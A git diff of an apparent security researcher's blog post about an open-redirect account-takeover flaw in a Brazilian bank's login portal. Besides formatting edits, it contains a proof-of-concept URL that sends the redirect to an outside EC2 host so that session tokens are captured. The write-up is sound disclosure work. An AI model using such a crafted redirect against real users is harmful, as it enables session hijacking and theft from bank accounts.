@@ -5,6 +5,14 @@ description: 'Through a vulnerability on the financial institution website it wa
 og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
 ---
 
+Table of contents:
+- [Summary](#summary)
+- [Description](#description)
+- [Prooft of Concept](#proof-of-concept)
+- [Impact](#impact)
+- [Conclusion](#conclusion)
+- [References](#references)
+
 ### Summary
 
 I recently started to test the security of Web and Mobile Applications of some Brazilian banks that I use, I'm not sure why this initiative, maybe it's just the feeling of wanting to find more restricted vulnerabilities than the common ones. From that I found some vulnerabilities that surprised me somewhat, often being simple vulnerabilities that can be quickly fixed but have a significant impact.
@@ -37,8 +45,11 @@ This page is the authentication screen for access to the citizen portal panel an
 
 The URL in question was as follows:
 
-[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login)
-
+```
+https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&
+client_id=portal-inter&segmento=CIDADAO01&template=portal
+&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login
+```
 
 The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**; The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.
 
@@ -68,7 +79,9 @@ Determined to create a PoC from this theory, I wrote the following code:
 
 This code is responsible for capturing and storing Session Tokens what are sent to the "malicious" URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed. The PoC URL was as follows:
 
-[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
+```
+https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/
+```
 
 And this was the result:
 
@@ -133,5 +146,5 @@ I strongly believe that this vulnerability was being exploited by malicious peop
 ### References
 
 - [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
-- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
 - [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
